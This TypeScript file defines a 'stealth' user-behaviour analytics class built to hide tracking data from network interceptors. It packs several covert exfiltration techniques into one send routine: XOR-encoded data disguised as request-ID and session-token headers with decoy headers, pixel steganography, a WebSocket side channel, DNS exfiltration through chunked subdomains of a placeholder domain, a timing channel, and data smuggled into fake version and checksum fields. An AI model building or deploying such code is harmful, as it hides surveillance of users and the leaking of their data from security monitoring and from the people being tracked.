/**
 * Stealth UBA Analytics - Hidden from Network Interceptors
 * Multiple techniques to obfuscate metadata transmission
 */

export class StealthUBAAnalytics {
  private encryptionKey: string;
  
  constructor() {
    // Generate unique session key
    this.encryptionKey = this.generateSessionKey();
  }

  // Method 1: Base64 + XOR Encryption in Headers
  private encryptMetadata(data: any): string {
    const jsonString = JSON.stringify(data);
    const encrypted = this.xorEncrypt(jsonString, this.encryptionKey);
    return btoa(encrypted); // Base64 encode
  }

  private xorEncrypt(text: string, key: string): string {
    let result = '';
    for (let i = 0; i < text.length; i++) {
      result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
  }

  // Method 2: Hide in Legitimate Headers
  private hideInHeaders(metadata: any): Record<string, string> {
    const encrypted = this.encryptMetadata(metadata);
    
    return {
      // Disguise as legitimate headers
      'X-Request-ID': encrypted.substring(0, 32),
      'X-Session-Token': encrypted.substring(32, 64),
      'X-Client-Version': encrypted.substring(64, 96),
      'X-Trace-ID': encrypted.substring(96),
      // Add decoy headers
      'User-Agent': navigator.userAgent,
      'Accept-Language': 'en-US,en;q=0.9',
      'Cache-Control': 'no-cache'
    };
  }

  // Method 3: Steganography in Image Data
  private hideInImage(metadata: any): Promise<string> {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d')!;
      canvas.width = 100;
      canvas.height = 100;
      
      // Create noise pattern
      const imageData = ctx.createImageData(100, 100);
      const data = imageData.data;
      
      // Hide metadata in LSB of pixel data
      const metadataString = JSON.stringify(metadata);
      const metadataBytes = new TextEncoder().encode(metadataString);
      
      for (let i = 0; i < data.length; i += 4) {
        data[i] = Math.random() * 255;     // Red
        data[i + 1] = Math.random() * 255; // Green  
        data[i + 2] = Math.random() * 255; // Blue
        data[i + 3] = 255;                 // Alpha
        
        // Hide data in LSB
        if (i / 4 < metadataBytes.length) {
          data[i] = (data[i] & 0xFE) | (metadataBytes[i / 4] & 1);
        }
      }
      
      ctx.putImageData(imageData, 0, 0);
      resolve(canvas.toDataURL());
    });
  }

  // Method 4: WebSocket Side Channel
  private sendViaWebSocket(metadata: any): void {
    const ws = new WebSocket('wss://your-analytics-endpoint.com/ws');
    ws.onopen = () => {
      ws.send(JSON.stringify({
        type: 'behavior_data',
        sessionId: this.generateSessionId(),
        data: this.encryptMetadata(metadata)
      }));
      ws.close();
    };
  }

  // Method 5: DNS Exfiltration (Advanced)
  private sendViaDNS(metadata: any): void {
    const compressed = this.compressData(JSON.stringify(metadata));
    const chunks = this.chunkData(compressed, 50); // DNS label limit
    
    chunks.forEach((chunk, index) => {
      const subdomain = `${chunk}.${index}.analytics.yourdomain.com`;
      // Trigger DNS lookup
      const img = new Image();
      img.src = `https://${subdomain}/pixel.gif`;
    });
  }

  // Method 6: Timing-based Covert Channel
  private sendViaTimingChannel(metadata: any): void {
    const binaryData = this.toBinary(JSON.stringify(metadata));
    let index = 0;
    
    const sendBit = () => {
      if (index < binaryData.length) {
        const bit = binaryData[index];
        const delay = bit === '1' ? 100 : 50; // Different delays for 1 and 0
        
        setTimeout(() => {
          // Send innocuous request with timing pattern
          fetch('/api/heartbeat', { method: 'HEAD' });
          index++;
          sendBit();
        }, delay);
      }
    };
    
    sendBit();
  }

  // Method 7: Polyglot Payload (Looks like different data)
  private createPolyglotPayload(originalPayload: any, metadata: any): any {
    const metadataString = JSON.stringify(metadata);
    const encoded = btoa(metadataString);
    
    return {
      ...originalPayload,
      // Hide in seemingly innocent fields
      clientVersion: encoded.substring(0, 20),
      requestId: encoded.substring(20, 40),
      sessionToken: encoded.substring(40, 60),
      checksum: encoded.substring(60),
      // Add decoy data
      timestamp: Date.now(),
      locale: 'en-US',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
  }

  // Utility methods
  private generateSessionKey(): string {
    return Array.from(crypto.getRandomValues(new Uint8Array(32)))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  }

  private generateSessionId(): string {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
  }

  private compressData(data: string): string {
    // Simple compression - in production use proper compression
    return data.replace(/\s+/g, ' ').trim();
  }

  private chunkData(data: string, size: number): string[] {
    const chunks = [];
    for (let i = 0; i < data.length; i += size) {
      chunks.push(data.substring(i, i + size));
    }
    return chunks;
  }

  private toBinary(text: string): string {
    return text.split('').map(char => 
      char.charCodeAt(0).toString(2).padStart(8, '0')
    ).join('');
  }

  // Main method - combines multiple techniques
  public async sendStealthData(payload: any, metadata: any): Promise<void> {
    // Method 1: Primary - Hidden in headers
    const headers = this.hideInHeaders(metadata);
    
    // Method 2: Backup - WebSocket side channel
    this.sendViaWebSocket(metadata);
    
    // Method 3: Steganography backup
    const imageData = await this.hideInImage(metadata);
    
    // Send main request with hidden metadata
    fetch('/api/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: JSON.stringify({
        ...payload,
        // Hidden in plain sight
        _img: imageData.split(',')[1], // Base64 part only
        _meta: this.createPolyglotPayload({}, metadata)
      })
    });
  }
}